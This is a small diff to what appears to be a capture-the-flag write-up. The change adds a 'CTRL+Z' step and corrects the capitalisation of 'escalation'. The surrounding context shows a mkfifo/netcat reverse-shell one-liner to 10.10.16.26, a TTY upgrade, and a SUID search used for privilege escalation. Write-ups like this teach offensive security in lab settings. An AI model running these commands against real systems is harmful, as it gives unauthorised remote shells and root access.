@@ -118,6 +118,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.26 87 >/tmp/f
 
 ```sh
 python3 -c 'import pty;pty.spawn("/bin/bash");'
+CTRL+Z
 stty raw -echo
 fg
 export TERM=xterm
@@ -132,7 +133,7 @@ We can now capture the user flag!
 
 **Privilege Escalation**
 
-We are trying privilege Escalation By using SUID. Let's start with this command:
+We are trying privilege escalation By using SUID. Let's start with this command:
 
 ```sh
 find / -perm -4000 -type f 2>/dev/null
